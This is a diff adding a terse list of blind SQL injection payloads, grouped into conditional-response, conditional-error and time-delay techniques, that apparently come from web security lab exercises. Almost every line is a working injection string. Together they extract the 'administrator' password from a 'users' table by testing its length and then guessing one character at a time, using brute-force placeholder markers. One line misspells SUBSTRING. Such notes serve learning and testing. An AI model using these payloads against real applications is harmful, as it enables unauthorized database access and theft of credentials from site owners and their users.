@@ -1,0 +1,38 @@
+blind sql inj with conditional responses
+' AND '1'='1
+' AND '1'='2
+' AND (SELECT 'a' FROM users LIMIT 1)='a
+' AND (SELECT 'a' FROM users WHERE username='administrator')='a
+' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
+' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>2)='a #repeater
+' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>3)='a
+' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a #repeater
+' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='$a$
+' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='a
+blind sql inj with conditional errors
+'
+'||(SELECT '')||'
+'||(SELECT '' FROM dual)||'
+'||(SELECT '' FROM not-a-real_table)||'
+'||(SELECT '' FROM users WHERE ROWNUM = 1)||'
+'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
+'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
+'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+'||(SELECT CASE WHEN LENGTH(password)>2 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+'||(SELECT CASE WHEN LENGTH(password)>3 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+'||(SELECT CASE WHEN SUBSTR(password,1,1)='$a$' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||' #a-z and 0-9 payload 
+'||(SELECT CASE WHEN SUBSTR(password,2,1)='$a$' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+blind sql inj with time delays
+'||pg_sleep(10)--
+blind sql inj with time delays and information retrieval
+'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
+'%3BSELECT+CASE+WHEN+(1=2)THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
+'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
+'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
+'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
+'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>3)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
+'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
+'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='$a$')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users-- #0-9 a-z
+'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SBUSTRING(password,2,1)='$a$')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
